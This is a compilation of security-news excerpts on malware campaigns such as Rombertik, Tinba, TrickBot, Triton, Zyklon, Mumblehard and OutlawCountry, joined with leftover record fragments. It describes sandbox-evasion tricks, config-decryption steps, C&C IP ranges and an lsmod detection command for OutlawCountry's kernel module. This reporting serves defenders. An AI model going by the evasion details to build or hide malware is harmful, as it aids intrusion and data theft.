initially believed NotPetya (also known as PetrWrap, exPetr, GoldenEye and Diskcoder.C) was a piece of ransomware. However, a closer analysis revealed that it was actually a wiper. In addition to Maersk, the list of major organizations hit by the incident includes Rosneft, Merck, FedEx-owned TNT Express, Mondelez International, Nuance Communications, Reckitt Benckiser, and Saint-Gobain. These companies reported that the attack had cost them tens and even hundreds of millions of dollars. " }

According to the company, which serves 1.6 million customers across 46 U.S. states, the malware was designed to harvest information such as cardholder name, credit and debit card number, and expiration date. Depending on how the kiosk was configured and the service used by the customer, the malware may have also stolen names, email addresses and even biometric information in the case of customers who utilized the fingerprint scanner to pay for their items. Avanti said the breach was discovered on July 4 and its internal response team has taken measures to secure systems, including changing passwords. Payment processing systems have been shut down at some locations while the malware is being removed. The company has notified law enforcement and it plans on offering credit monitoring services to affected individuals. “We continue to assess and modify our privacy and data security policies and procedures to prevent similar situations from occurring. For instance, we are in the middle of implementing an end to end encryption solution for all of our kiosks, and are working on expediting that implementation,” Avanti told customers. “Theft of data and similar incidents are difficult to prevent in all instances, however, we will be reviewing our systems and making improvements where we can to minimize the chances of this happening again.” While the firm has not named the piece of malware used in the attack, security blogger Brian Krebs revealed that a July 7 blog post from Risk Analytics describing a PoSeidon (FindPOS) infection on a break room vending kiosk at a customer’s office was actually part of the Avanti campaign. “This is a textbook example of an Internet of Things (IoT) threat: A network-connected device, controlled and maintained by a third party, which cannot be easily patched, audited, or controlled by your own IT staff,” said Risk Analytics’ Noah Dunker. The security firm detected the malware on its customer’s network using known indicators of compromise (IoC) for PoSeidon.

Also known as the Tinybanker Trojan, the malware is being delivered via sites infected by the exploit kit, which targets vulnerabilities in Adobe Flash Player and Microsoft Silverlight, explained Avast virus analyst David Fiser. If the user's system is vulnerable, the exploit executes malicious code that downloads and executes the Tinba Trojan.   When the infected user tries to log in to one of the targeted banks, webinjects are used to trick the victim into filling out a form with his or her personal data - including social security numbers, address and credit card information. If the victim does this, the data is sent to the attackers.   \"In the case of the Tinba “Tiny Banker” targeting Czech users, the payload was simply encrypted with a hardcoded RC4 password,\" Fiser blogged. \"However, in this case, a few more steps had to be done.\"   At first, the researchers located the folder with the installed banking Trojan, Fiser continued. This folder contained an executable file and the configuration file.   \"At first, XOR operation with a hardcoded value 0xac68d9b2 was applied,\" he explained. \"Then, RC4 decryption with hardcoded password was performed. After RC4 decryption, we noticed AP32 marker at the beginning of the decrypted payload, which signalized aplib compression. Therefore, after aplib decompression, we got the configuration file in plaintext. After studying this roughly 65KB long plaintext file, we noticed that it targets financial institutions worldwide.\"   The malware was first identified back in 2012 hitting targets in Turkey. At the time, it was linked to the Blackhole exploit kit. It was given the name Tinybanker/Tinba because of its small size - approximately 20 KB. The most recent changes come two months after reports surfaced that its source code had been leaked on to the Internet.  " }

In an effort to ensure that their creation cannot be analyzed, the malware authors have included some clever mechanisms. Rombertik is distributed as a file attached to spam and phishing messages. Once it’s executed, the malware starts performing anti-analysis checks to make sure that it’s not running in a sandbox. One of the evasion methods used by the info-stealer involves the use of garbage data. Experts have determined that 97 percent of the Rombertik executable consists of 75 images and more than 8,000 functions that are not utilized. Many sandboxes are designed to monitor a file only for a certain period of time to determine if it’s malicious or not. That is why malware developers have started programing their creations to sleep before starting their malicious routines. Rombertik doesn’t sleep. Instead, it evades sandboxes by writing one byte of random data to memory 960 million times. While this method is similar to sleeping, it can be much more effective against tracking tools and sandboxes. “Sandboxes may not be able to immediately determine that the application is intentionally stalling since it’s not sleeping. The other disadvantage is that the repetitive writing would flood application tracing tools,” Cisco explained in a blog post. “If an analysis tool attempted to log all of the 960 million write instructions, the log would grow to over 100 gigabytes. Even if the analysis environment was capable of handling a log that large, it would take over 25 minutes just to write that much data to a typical hard drive.” The malware is designed to terminate if certain anti-analysis checks fail. If no analysis tools are detected, Rombertik starts decrypting and executing the unpacking code in memory. This code contains function overlaps and unnecessary jumps to increase complexity and prevent analysis. According to Cisco, Rombertik is similar to the notorious Dyre Trojan. However, unlike Dyre, which is designed to steal information from online banking sites, Rombertik collects usernames and passwords from all the websites visited by the victim. It does this by checking running processes for the presence of a web browser. If Chrome, Internet Explorer or Firefox are running, the malware injects itself into the process and hooks API functions that handle plaintext data. This allows the threat to capture any data entered by the user into a website before it gets encrypted. But before starting its information theft routines, the malware does one last check to ensure that it’s not being analyzed. If this check fails, the threat starts exhibiting wiper behavior. First, it attempts to overwrite the Master Boot Record (MBR), which makes the infected device inoperable. If it doesn’t have permission to overwrite the MBR, Rombertik will attempt to encrypt files stored in the home folder using a randomly generated RC4 key. Once the MBR is overwritten, the computer is restarted and the victim is presented with a message that reads, “Carbon crack attempt, failed.” In addition to preventing the computer from booting, the malware also overwrites bytes for disk partitions, making it difficult to recover data. “While Talos has observed anti-analysis and anti-debugging techniques in malware samples in the past, Rombertik is unique in that it actively attempts to destroy the computer if it detects certain attributes associated with malware analysis,” Cisco researchers noted.

PluginPhantom focuses on data theft and it’s capable of stealing files, contacts, location data and Wi-Fi information. The threat can also take photos, capture screenshots, intercept and send SMS messages, record audio and log keystrokes. PluginPhantom is believed to be a successor of Android.Trojan.Ihide, a piece of malware analyzed by TrustLock in July. However, unlike other Android Trojans and its predecessor, PluginPhantom is based on a type of design architecture where the malicious application is divided into a main host app and multiple plugins. To achieve this, it uses DroidPlugin, a plugin framework developed by Chinese security firm Qihoo 360. DroidPlugin enables a host application to run multiple plugins without the need to install them. This has allowed PluginPhantom developers to implement various malicious functions in different plugins, which can be loaded and launched by the host app. PluginPhantom has nine plugins embedded in the host app as asset files. These include three core plugins, designed for command and control (C&C) server communications and updates, and six plugins focusing on data theft. In addition to the functionality provided by the plugins, the main app includes keylogging capabilities obtained by abusing Accessibility features. Palo Alto Networks researchers told SecurityWeek that they have no reason to believe the malware has made it onto Google Play, but they don’t have any information on how the threat has been distributed. There is also no information on who might be targeted, but the security firm pointed out that the location data collected by the malware is translated to coordinate systems used by Baidu Maps and Amap Maps, navigation apps that are highly popular in China. By hiding the malicious functionality in plugins, the Android Trojan increases its chances of evading static detection mechanisms. PluginPhantom appears to be the first Android Trojan to leverage this method, but experts believe other malware developers may start using it and it’s possible that it will end up replacing the widely used repackaging techniques. “Since the plugin development pattern is generic and the plugin SDK can be easily embedded, the plugin architecture could be a trend among Android malware in the future,” Palo Alto Networks researchers said. In related news, researchers from Check Point Software Technologies shared details on Wednesday of new Android malware that has compromised more than a million Google Accounts. Dubbed Gooligan by the security firm, the malware targets devices running Android 4 and 5 and can steal authentication tokens stored on devices which can be used to access sensitive data from Gmail, Google Photos, Google Docs and other services, including G Suite.

But according to researchers at Trend Micro, enhancements in the world of ransomware have not stopped as the year as 2013 has come to a close. According to the company, a piece of ransomware they believe is a variant of CryptoLocker has the ability to now spread through removable drives. This update is significant because it has not been seen in other variants and the added propagation routines means the malware can easily spread, according to Trend Micro. \"Aside from its propagation technique, the new malware bears numerous differences from known CryptoLocker variants,\" blogged Abigail Pichel of Trend Micro. \"Rather than relying on a downloader malware—often UPATRE— to infect systems, this malware pretends to be an activator for various software such as Adobe Photoshop and Microsoft Office in peer-to-peer (P2P) file sharing sites. Uploading the malware in P2P sites allows bad guys to easily infect systems without the need to create (and send) spammed messages.\" In another break from the norm, the malware – detected by Trend Micro as WORM_CRILOCK.A – has abandoned domain generation algorithm (DGA). Instead, its command-and-control (C&C) servers are hardcoded into the malware. \"Hardcoding the URLs makes it easier to detect and block the related malicious URLs. DGA, on the other hand, may allow cybercriminals to evade detection as it uses a large number of potential domains,\" Pichel noted. \"This could mean that the malware is still in the process of being refined and improved upon. Thus, we can expect latter variants to have the DGA capability.\" There are a number of other differences between the malware and other versions of CryptoLocker, so much so that some have questioned whether or not the variant is a variant at all. Researchers at ESET for example noted that this malware - which calls itself CryptoLocker 2.0 - claims to use RSA-4096 (it actually uses RSA-1024) anad doesn't show a countdown timer like CryptoLocker. It also only accepts the ransom in Bitcoins as opposed to other methods. \"Taking into account all the aforementioned differences, it is unlikely that the malware that calls itself 'Cryptolocker 2.0' is actually a new version of the previous Cryptolocker ransomware from the same authors,\" blogged Robert Lipovsky, a malware researcher at ESET. In any event, research from Dell SecureWorks suggests that CryptoLocker has done significant damage. According to the company, the criminal gang behind CryptoLocker infected between 200,000 and 2500,000 computers in the first 100 days of a campaign that began Sept. 5. \"Based on this information and measurements of infection rates, CTU researchers estimate a minimum of 0.4%, and very likely many times that, of CryptoLocker victims are electing to pay the ransom,\" blogged Keith Jarvis, Dell SecureWorks Counter Threat Unit Threat Intelligence. \"Based on its design, deployment method, and empirical observations of its distribution, CryptoLocker appears to target English-speakers, specifically those located in the United States,\" Jarvis added. \"Malware authors from Russia and Eastern Europe, where the CryptoLocker authors are thought to originate, commonly target victims in North America and Western Europe. Law enforcement cooperation between these regions is complicated by numerous factors, which often results in threat actors believing that they can operate with impunity.\" According to Pichel, to avoid the latest variant of CryptoLocker, Web surfers should be wary of using peer-to-peer sites to get copies of software, and instead visit reputable sites. \"Given WORM_CRILOCK’s ability to spread via removable drives, users should also exercise caution when using flash drives and the like,\" she blogged, adding that users should never connect their drives into unfamiliar or unknown machines.

Citizen Lab learned of the attacks after being contacted by China Digital Times (CDT), a California-based bilingual news website covering China. Someone purporting to be a UC Berkeley student sent an email to a CDT journalist claiming to have “insider information” on cyberattacks launched at Mingjing News after it interviewed a Chinese billionaire who accused high-ranking officials in China’s Communist Party of being corrupt. Other CDT staff received similar emails the following days. The messages contained a link pointing to a fake CDT website designed to redirect users to a WordPress phishing page. CDT does run on WordPress and the fake login page was well designed, suggesting that the attacker had put considerable effort into the campaign. The attack on CDT lasted for roughly 20 days, but it did not appear to be successful and the threat group moved on to other targets. An analysis of the server used to host the phishing website and registration data showed that the group had also set up several other domains designed to mimic popular Chinese-language news websites that are blocked in China. This includes Mingjing News, Epoch Times, HK01 and Bowen Press. The fake domains have apparently been set up for various purposes, including phishing, malware delivery and reconnaissance. While Citizen Lab identified fake domains designed to mimic the ones of the aforementioned news websites, researchers were unable to confirm that these organizations were directly targeted by the threat group. The malware involved in the attacks is NetWire, a remote access trojan (RAT) known to be used by several actors. The malware was configured to bypass detection and make analysis more difficult. The threat group is believed to have targeted Chinese-language news sites since at least 2015. Researchers also discovered links between this campaign and a 2013 operation aimed at a Tibetan radio station, and a 2015 attack targeting Thai government agencies. The digital certificate used to sign the malware is the same as one spotted last year in attacks aimed at the gaming industry. One possibility is that the same threat group is behind all operations, but a more likely scenario is that different actors have shared some resources. As far as attribution is concerned, Citizen Lab pointed out that the targeted organizations are of interest to the Chinese government. “It is noteworthy that all of the fake websites our researchers discovered in this campaign are meant to mimic news websites that publish content critical of the Chinese government. It is possible the operators behind this campaign are ‘hackers for hire’ — typical of the way in which a lot of cyber espionage is outsourced in China,” explained Ronald Deibert, director of Citizen Lab. “However, we are unable to positively attribute this campaign to a specific state agency.” Related Reading: Operation Cloud Hopper: China-based Hackers Target Managed Service Providers Related Reading: APT3 Hackers Linked to Chinese Ministry of State Security Related Reading: China-Linked Hackers Target U.S. Trade Group " }

The Dyre Trojan, which is distributed with the aid of other pieces of malware such as Upatre and Bartalex, has made numerous headlines lately. Last month, IBM reported that a cybercriminal gang had used the malware to steal over $1 million from the corporate accounts of U.S. businesses in an operation dubbed “Dyre Wolf.” According to Seculert, the new Dyre sample they’ve analyzed is designed to check the number of processor cores on the infected machine. Since most modern PCs have at least two cores, a single core could indicate the presence of a sandbox. That is because sandboxes are usually configured to use only one core in order to save resources. Numerous threats use anti-sandbox techniques to evade detection. However, most malware families leverage multiple techniques to achieve this goal. Dyre only uses this processor core counting technique, but it appears to be highly effective. Seculert has tested the malware, which it discovered in early April, against four non-commercial and four commercial sandboxes and they all failed to analyze the new Dyre variant. “Trying to put ourselves in the mindset of the cyber criminals, it is possible that they conducted their own research and determined that this one particular technique or check was the key to remaining undetected by sandboxing solutions,” Aviv Raff, CTO of Seculert, said in a blog post. Raff says they are not disclosing the names of the sandboxes they have used in their tests. “We wouldn't like to help the bad guys here, while the vendors are working on a fix,” he told SecurityWeek. The malware developers have also attempted to ensure that their creation is not detected by signature-based security systems. For this purpose, they have changed user agents and the way the malware behaves. The Dyre sample analyzed by Seculert was downloaded by a new version of the Upatre malware. This Upatre variant has a new communication path and uses two user agents instead of one like the older version. Researchers noted that in older variants the communication path was almost identical to the one of Dyre. Seculert told SecurityWeek that other downloaders have also been seen downloading the new Dyre version. “The Dyre malware’s success at evading sandboxes is just another example of why sandboxing, as a standalone, is an incomplete security approach,” Raff explained. “Rather the ability to detect evasive malware needs to include machine learning and the analysis of outbound traffic over time. This approach will provide a much more comprehensive security posture in today’s worsening threat landscape.” " }

Researchers at Fidelis Cybersecurity spotted TrickBot in September. The malware’s configuration file indicated that it had been set up to target several banks in Australia and one in Canada. However, the samples analyzed by the security firm only included a module for collecting system information – the web injection modules appeared to be in a testing phase. IBM X-Force researchers revealed on Tuesday that TrickBot is now fully operational and it’s capable of deploying server-side injections and redirection attacks, which are considered two of the most sophisticated techniques a banking Trojan can use. IBM pointed out that early versions of TrickBot were also set up to target a digital banking platform commonly used by regional banks in the United States. In early November, X-Force spotted two new configurations that enable redirection attacks against four banks in the UK and server-side injections against several Australian organizations. In addition to the UK and Australia, experts say the malware targets the personal and business banking websites of financial institutions in New Zealand, Canada and Germany. However, considering that the malware has been developed at a fast pace, researchers expect to see even more targets in the coming weeks. According to X-Force, TrickBot authors have conducted small-volume testing via malvertising, the RIG exploit kit, fake fax emails carrying malicious attachments, and poisoned Office macros delivered via the Godzilla loader. Fidelis Cybersecurity identified several similarities between TrickBot and the notorious banking Trojan Dyre, which disappeared from the scene in November 2015 likely as a result of an operation carried out by Russian authorities. Experts noted that despite the similarities, TrickBot is a rewrite with a different coding style. X-Force researchers agree that parts of the Dyre team are likely involved in the development of TrickBot. Another possibility is that someone who values Dyre wants to build a similar piece of malware. “TrickBot has been in testing for about two to three months now, and yet its developers have already managed to implement two of the most advanced browser manipulation techniques observed in banking malware in the past few years,” said Limor Kessem, executive security advisor at IBM Security. “TrickBot is moving fast, and we expect to see it amplify infection campaigns and fraud attacks, sharpen its aim on business and corporate accounts, and paint itself into the banking malware picture in the coming months.” Related Reading: Zeus Banking Trojan Distributed via MSG Attachments Related Reading: Ramnit Banking Trojan Resumes Activity Related Reading: Gozi Banking Trojan Campaigns Target Global Brands " }

In 2009, Verizon also reported of PoS RAM scrapers alongside its victim profiles; targets were primarily the retail and hospitality industries.\"   PoS RAM scraper families really started to evolve around the end of 2011, and there has been a steady release of new PoS RAM scraper families as new attack techniques were developed, he added.   Businesses in the United States have been the biggest targets of PoS malware. According to Trend Micro, roughly 74 percent of PoS malware detections between April and June have been in the U.S. The Philippines and Japan were second and third on the list at 4.62 percent and 4.41 percent, respectively. The retail industry was the hardest hit, accounting for 67.51 percent of PoS malware detections.   \"It is not surprising that the largest volume of detections was seen in the United States because the country’s economy is heavily geared toward purchasing goods and services using credit cards,\" the report notes. \"Consumers in other countries still tend to use cash or debit cards more than credit cards. The high volume of credit card transactions that companies process in the United States makes it a lucrative target for PoS RAM scrapers.\"   The report recommends PoS system operators follow best practices for security, including the use of multitier firewalls to protect networks and restricting access to the Internet on PoS systems.   \"Credit card data breaches are not slowing down any time soon, and cybercriminals have different techniques to target all industries,\" said Jon Clay, senior manager of global threat communications at Trend Micro.  \"However, our research has revealed that a high majority of PoS RAM scrapers affect the retail industry since these businesses have high credit card transaction volumes,\" Clay said. \"Therefore, it is imperative, now more than ever, that retailers must be on the lookout for these types of data breaches and put preventative measure in place to verify the authenticity of all transactions.\" " }

The malware, designed to target industrial control systems (ICS), was discovered after it caused a shutdown at an organization in the Middle East. Both FireEye and Dragos published detailed reports on the threat. Triton is designed to target Schneider Electric Triconex SIS devices, which are used to monitor the state of a process and restore it to a safe state or safely shut it down if parameters indicate a potentially dangerous situation. The malware uses the TriStation proprietary protocol to interact with SIS controllers, including read and write programs and functions. Schneider initially believed that the malware had not leveraged any vulnerabilities in its product, but the company has now informed customers that Triton did in fact exploit a flaw in older versions of the Triconex Tricon system. The company says the flaw affects only a small number of older versions and a patch will be released in the coming weeks. Schneider is also working on a tool – expected to become available next month – that detects the presence of the malware on a controller and removes it. Schneider has highlighted, however, that despite the existence of the vulnerability, the Triton malware would not have worked had the targeted organization followed best practices and implemented security procedures. Specifically, the Triton malware can only compromise a SIS device if it’s set to PROGRAM mode. The vendor recommends against keeping the controller in this mode when it’s not actively configured. Had the targeted critical infrastructure organization applied this recommendation, the malware could not have compromised the device, even with the existence of the vulnerability, which Schneider has described as only one element in a complex attack scenario. The company noted that its product worked as designed – it shut down systems when it detected a potentially dangerous situation – and no harm was incurred by the customer or their environment. In its advisory, Schneider also told customers that the malware is capable of scanning and mapping systems. “The malware has the capability to scan and map the industrial control system to provide reconnaissance and issue commands to Tricon controllers. Once deployed, this type of malware, known as a Remotely Accessible Trojan (RAT), controls a system via a remote network connection as if by physical access,” Schneider said. The industrial giant has advised customers to always implement the instructions in the “Security Considerations” section of the Triconex documentation. The guide recommends keeping the controllers in locked cabinets and even displaying an alarm whenever they are set to “PROGRAM” mode. While it’s unclear who is behind the Triton/Trisis attack, researchers agree that the level of sophistication suggests the involvement of a state-sponsored actor. Industrial cybersecurity and threat intelligence firm CyberX believes, based on its analysis of Triton, that the malware was developed by Iran and the targeted organization was in Saudi Arabia. " }

AV-TEST identified roughly 127.5 million malware samples last year, which represents a 14% decrease from the 144 million seen in 2015. This translates to approximately 350,000 new samples each day, or four new samples per second. The number of samples may have declined, but malware is becoming increasingly sophisticated, as demonstrated by the NotPetya and WannaCry ransomware attacks, banking Trojans, and threats designed to target Internet of Things (IoT) devices. This includes complex encryption and increased flexibility in the case of ransomware, and the use of special malware in attacks aimed at the SWIFT banking network. While the threat posed by ransomware has been made clear by recent attacks, this type of malware accounts for only less than one percent of the total share of Windows malware. Despite the small proportion, AV-TEST pointed out that, due to their mode of action and potential damage, these types of Trojans cannot be considered a marginal phenomenon. “A level of distribution comparable to traditional viruses is not required to reap the greatest possible profit. Ransomware involves ‘high-tech malware’, which seeks its victims above all in a targeted business environment. For instance, emails infected with ransomware are sent out almost exclusively on weekdays,” AV-TEST said. Ransomware development peaked in the first quarter of 2017, with more than 110,000 samples detected by the company in April. The quantity of Windows malware has decreased, but AV-TEST noticed that the number of Mac OS samples increased by 370% to 3,033 samples – a majority of which have been classified as Trojans. More than 4,000 new samples were already identified in the first quarter of 2017.  The number of Android malware samples doubled in 2016 to over 4 million, with the largest spike recorded in June, when AV-TEST identified nearly 650,000 new pieces of malware. In the same month, the company spotted more than 9,200 exploits covering all versions of Android. The complete AV-TEST Security Report 2016/2017 is available online in PDF format. " }

Zyklon has been around since early 2016 and it allows attackers to conduct a wide range of malicious activities, including launch distributed denial-of-service (DDoS) attacks, log keystrokes, steal passwords, and mine cryptocurrency. A recent campaign observed by FireEye has been aimed at organizations in the telecommunications, insurance and financial services sectors. The malware has been delivered as a ZIP archive attached to spam emails. The ZIP file contains a specially crafted Word document that exploits one of three weaknesses in Microsoft Office to deliver a PowerShell script that downloads the final Zyklon payload from a remote server. One of the vulnerabilities exploited by the malicious documents is CVE-2017-8759, a flaw patched by Microsoft in September 2017 after FireEye noticed that it had been exploited to deliver spyware. The security hole was later used by China-linked cyberspies to target organizations in the United States. Another flaw exploited to deliver Zyklon is CVE-2017-11882, a 17-year-old vulnerability in the Equation Editor component that Microsoft patched in November. CVE-2017-11882 has been leveraged by Iranian cyberspies, the Cobalt hacking group, and others. Cybercriminals have also abused the Dynamic Data Exchange (DDE) feature in Office to spread the malware. Russia-linked cyberspies and many other threat actors have abused DDE to deliver malware, which ultimately led to Microsoft disabling the feature in all versions of Word in an effort to prevent attacks. If the malicious documents successfully exploit one of these weaknesses, they download a PowerShell script that injects code and fetches the final payload from a server. The malware uses the Tor network to communicate with its command and control (C&C) server. Once a connection has been established, the attacker can instruct the malware to provide information about the infected system, launch DDoS attacks, mine cryptocurrency, and upload harvested data. In addition to built-in functionality, Zyklon has several plugins that can be loaded for additional features. The plugins allow attackers to steal passwords from popular web browsers, FTP and email passwords, keys associated with video games, and software license keys. The malware can also establish a Socks5 proxy on the infected machine, and it can hijack the clipboard in order to replace Bitcoin addresses copied by the victim with addresses owned by the attacker.

It has since been taken down. But at one point, it may have been downloaded as many as 50,000 times, according to Lookout Mobile Security. \"Once you’ve downloaded the app, Bazuc can be used to send virtually untraceable SMS messages in bulk, which look like they came from your phone,\" blogged Marc Rogers, a researcher with Lookout. \"In fact, they did come from your phone. The authors of Bazuc are charging companies to have users send out these cheap SMS messages on their behalf, helping the companies bypass spam detection and automated anti-fraud systems. This operation is putting personally- identifiable information at risk, exposing targeted users to phone calls and SMSs from unknown people, and swindling operators out of money.\" On the surface, it doesn't sound like a bad deal. Bazuc, Rogers explained, is actually a pair of applications: 'Bazuc Earn Money' and 'Bazuc Free International SMS'. Bazuc Earn Money offers to pay $.001 per message, and tells the user they may earn as much as $30 a month. However to earn that $30, 30,000 messages would have to be sent.  With Bazuc Free International SMS, when a person tries to send a message to an international number, the app opens the default email, and puts the recipient’s phone number appended with @buzac.com in the 'to' field. Afterwards, the user is invited to type a message into the email. \"\"Bazuc Free International SMS\" remained non-functional for the duration of our testing, suggesting that it may be part of a cover for the dodgy SMS network,\" Rogers continued. \"By establishing a friendly cover like this, it makes users more comfortable with allowing their devices to be used.\" Lookout investigated the SMS network and found a number of players involved both wittingly and unwittingly – bulk messaging providers, phishers, spammers, banks and smartphone owners. Despite the app author's claim that the app is used to offer free messaging to users, out of 200 messages Lookout analyzed, they only saw human-to-human messages three times. The majority of the messages appear to be machine-to-machine, with 40 percent being service or transaction alerts and 30 percent PIN code and password messages. Eight percent appear to be advertising spam. \"Although all the messages sent through our test devices were aimed at U.S. subscribers, few if any of the messages appeared to be U.S. in origin,\" Rogers wrote. \"Some of the identifiable countries of origin that we saw were Nigeria, Russia, Poland and Mexico.\" Several messages were identified to have come from well-known American and African banks. While at first glance the messages appear to be phishing messages, Lookout suspects they may be legitimate. The banks it seems signed up with the bulk SMS messaging network to send customer transaction information, Rogers explained. \"If that’s true, they aren’t alone,\" he blogged. \"During our examination of the network, we received PIN codes, chat invites, OTP or mobile TAN messages, psychic readings and even a wire transfer.\" \"Bazuc is one more in the growing category of grey area threats which operate by finding loopholes in the mobile ecosystem,\" he continued. \"Rather than Bazuc breaking the Terms of Service, it’s the people who download Bazuc who are violating their operator’s Terms of Service and put themselves at risk of having their cellphone service terminated. It’s the users that are likely to pay the price when operators start to terminate mobile accounts or charge out of bundle rates on those messages. At an average price of $0.10c - $0.15 per out-of-bundle message, these users could be looking at a bill of $300 – $400 for messages. Compare that to the $3 Bazuc paid them.\" \"The user is also likely to be left holding the baby when concerned bank customers come calling,\" he added.  " }

The malware has been dubbed 'Mumblehard', and gives attackers a backdoor that allows them to control the systems they compromise. According to ESET, the malware goes back to at least 2009, and has a module for sending spam messages. \"Mumblehard components are mainly Perl scripts encrypted and packed inside ELF binaries,\" the firm noted in a whitepaper. \"In some cases, the Perl script contains another ELF executable with the same packer in the fashion of a Russian nesting doll.\" ESET researchers sinkholed the malware's backdoor module and collected statistics on the infected servers. During a seven-month period, they observed Mumblehard queries from a total of 8,867 unique IP addresses. The highest number of unique IP addresses seen in a single day was 3,292. \"There are two components in the Mumblehard malware family: a backdoor and a spamming daemon,\" blogged ESET's Marc-Etienne M.Leveille. \"They are both written in Perl and feature the same custom packer written in assembly language. The use of assembly language to produce ELF binaries so as to obfuscate the Perl source code shows a level of sophistication higher than average.\" \"Monitoring of the botnet suggests that the main purpose of Mumblehard seems to be to send spam messages by sheltering behind the reputation of the legitimate IP addresses of the infected machines,\" he explained. The researchers discovered what they believe is a connection the spam campaign and a company called Yellsoft, which sells software known as DirectMailer for sending bulk e-mail messages. According to ESET, command and control (C&C) servers hardcoded in the Mumblehard samples are all located in the IP range 194.54.81.162 to 194.54.81.164. \"If you check out the two next IP addresses, 194.54.81.165 and 194.54.81.166, you will find that both are name servers for yellsoft.net,\" according to ESET's whitepaper. \"Also, the yellsoft.net web server is hosted at 194.54.81.166. If you dig further, the five IP addresses, from 162 to 166, will answer the same NS and SOA record for this IP range, despite the fact that in reality, this range is served by rx-name.com. This strongly suggests that the five IP addresses are hosted on the same server.\" In addition, pirated copies of DirectMailer install the Mumblehard backdoor, according to ESET. Another possible infection vector noted by the firm is the use of Joomla and Wordpress exploits. Victims should look for unsolicited cronjob entries for all the users on their servers, the researcher noted in his blog. \"This is the mechanism used by the Mumblehard backdoor to activate the backdoor every 15 minutes,\" he wrote. \"The backdoor is usually installed in /tmp or /var/tmp. Mounting the tmp directory with the noexec option prevents the backdoor from starting in the first place.\" The whitepaper on the malware can be read here.  " }

According to Symantec, the Kelihos botnet (also known as Waledac) was being used to spam emails purporting to be from Apple. Recently, Kelihos was also involved in attacks targeting Russian victims by playing to anti-Western sentiments.   In the Apple-related case, the messages blasted out by the botnet tell the recipient that a purchase was made using their iTunes account. The emails had the subject line \"Pending Authorisation Notification.\"   \"The email says that the victim’s account has been used to purchase the film “Lane Splitter” on a computer or device that hadn’t previously been linked to their Apple ID,\" the Symantec Security Response Team explains in a blog post Sept. 5. \"The email gives an IP address that was used to make the alleged purchase and claims the address is located in Volgograd, Russia.\"   The messages told the victim if they didn't make the purchase, they should check their Apple ID by clicking on the accompanying link. The link however led the victim to a phishing disguised as an Apple website that prompts the visitor for their Apple ID and password. If the victim did so, the attackers would be able to leverage the credentials to compromise the account or for resale.   Symantec told SecurityWeek today that it does not have any information suggesting the campaign is still ongoing. The discovery however came on the heels of news that nude photos of a number of celebrities had been stolen from Apple iCloud and posted online.  Apple has said that none of the compromises resulted from a breach of Apple's Systems, including iCloud or Find my iPhone. Instead, the company attributed the situation to a targeted attack on usernames, passwords and security questions focused on celebrity accounts.   In light of the incident, Apple CEO Tim Cook has said the company will improve security around the iCloud data storage service by among other things alerting customers through email when someone tries to change their account password or restore iCloud data to a new device.   \"As long as people click on links in emails and open attachments attackers will exploit this weakness to gain a foothold in corporate networks,\" said Rohyt Belani, CEO of security firm PhishMe.   \"Organizations have to realize that no technology will block all phishing or detect all malware, so while it’s important to deploy the right network and endpoint protection technologies, you will still have to rely on humans to recognize and defend against threats that reach their inboxes,\" he added.

The security research group at Boulder, CO-based Internet services company Rapidity Networks set up some honeypots in hopes of capturing a Mirai sample. However, their traps have caught what they believe to be a new IoT worm that behaves similarly to Mirai. Since “Mirai” is the Japanese word for “future,” the company has decided to name the new piece of malware “Hajime,” which in Japanese can mean “beginning.” The first sample was discovered by Rapidity Networks in the wild on October 5, but the timestamp of a configuration file suggests that the threat has been around since at least September 26. In addition, one of the libraries used by the malware is dated before 2013, which experts believe could indicate that Hajime has been in development for several years. Similar to Mirai, Hajime scans the Internet in search of devices running the Telnet service and attempts to access them using a predefined list of common username and password combinations. Unlike Mirai, which relies on command and control (C&C) servers, Hajime uses a decentralized, peer-to-peer (P2P) network to receive updates and configuration files. According to Rapidity, the worm uses BitTorrent’s DHT (Distributed Hash Tables) protocol for peer discovery and the uTorrent Transport Protocol (uTP) for data exchanges. “For information exchange, Hajime piggybacks on BitTorrent’s DHT overlay network,” researchers explained. “To transfer files with its peers, Hajime ​uses the uTP implementation found in​ libutp. Hajime​ downloads files in a custom format which often contain payloads compressed with the LZ4 algorithm, and thus includes the decompression function from the LZ4 project.” Rapidity Networks has only spotted one Hajime module in the wild, which the worm uses to spread from one device to another. The purpose of the botnet remains unclear, but experts believe it can be used for DDoS attacks, as a distribution platform for other payloads, or to steal sensitive data from other machines housed by the same network as the Hajime-infected device. There is also the possibility that Hajime is part of a research project, similar to the “vigilante malware” named Wifatch. Based on the number of Hajime attack attempts recorded by its honeypots, Rapidity believes the malware may have infected somewhere between 130,000 and 185,000 IoT devices. While there are some similarities between Hajime and Mirai, there is no evidence that the two are connected. Researchers speculated that the new worm might be trying to pass off as Mirai in hopes of not drawing too much attention to itself. It’s unclear who developed Hajime, but based on its analysis, Rapidity has concluded that the author is an individual or group familiar with the C programming language, ARM/MIPS assembly language, cryptography, network protocols and the limitations of low-memory systems. Internal naming conventions suggest an English speaker, while timestamps show that the developers were most active in timeframes that would point to someone located in Europe. " }

OutlawCountry is described by its developers as a tool that uses a kernel module to create a hidden netfilter table on the targeted Linux system. The operator can then use this table to create new firewall rules with iptables commands and these rules will take precedence over existing ones. The rules can be used to redirect traffic from the infected machine to one controlled by the attacker. OutlawCountry documentation dated June 2015 states that the tool’s user needs to have shell access and root privileges to the targeted machine. As for hiding on the infected system, the new rules created by the malware are only visible to an administrator who knows the name of the table, and the table is removed if the kernel module is deleted by the operator. Since the documentation specifically names CentOS and Red Hat Enterprise Linux as the operating systems on which the tool works, Red Hat has published an advisory for users who may be concerned about the impact of OutlawCountry. The organization is still analyzing the available information, and in the meantime it has advised users to look for the existence of a file named nf_table_6_64.ko and the presence of a hidden table called dpxvke8h18 in the iptable rules. Users can check for the presence of the kernel module with the following lsmod command: lsmod | grep nf_table. Last month, WikiLeaks published documents detailing tools allegedly used by the CIA to spread malware on a targeted organization’s network (Pandemic), locate users via Wi-Fi (Elsa), hack routers and access points (Cherry Blossom), and hack air-gapped networks using USB drives (Brutal Kangaroo). WikiLeaks has also detailed tools designed for replacing legitimate files with malware, hacking Samsung smart TVs and routers, MitM tools, a framework used to make malware attribution and analysis more difficult, and a platform for creating custom malware installers.

